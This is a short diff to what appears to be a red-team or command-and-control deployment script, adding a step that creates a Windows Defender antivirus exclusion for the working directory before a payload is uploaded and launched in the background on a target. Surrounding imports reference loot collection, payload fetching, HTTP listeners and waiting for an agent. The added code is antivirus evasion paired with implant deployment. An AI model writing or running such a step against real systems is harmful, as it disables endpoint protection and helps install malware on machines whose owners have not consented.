@@ -120,7 +120,7 @@ def run(ctx):
         loot_list,
         payload_build_and_fetch,
     )
-    from lib.deploy import ensure_work_dir, execute_background, run_remote, upload
+    from lib.deploy import defender_add_exclusion, ensure_work_dir, execute_background, run_remote, upload
     from lib.listeners import http_listener_kwargs
     from lib.wait import TimeoutError as WaitTimeout
     from lib.wait import poll, wait_for_agent
@@ -192,6 +192,15 @@ def run(ctx):
         if not is_windows:
             run_remote(target, f"chmod +x {remote_payload}")
         print("  [deploy] uploaded")
+
+        # ── Pre-exec: Defender AV exclusion (Windows only) ────────────────
+        if is_windows:
+            try:
+                print(f"  [deploy] adding Defender AV exclusion for {target.work_dir!r}")
+                defender_add_exclusion(target, target.work_dir)
+                print("  [deploy] exclusion added (or Defender is disabled — both are fine)")
+            except Exception as exc:
+                print(f"  [deploy] Defender exclusion failed (non-fatal): {exc}")
 
         print("  [exec] launching payload in background on target")
         execute_background(target, remote_payload)
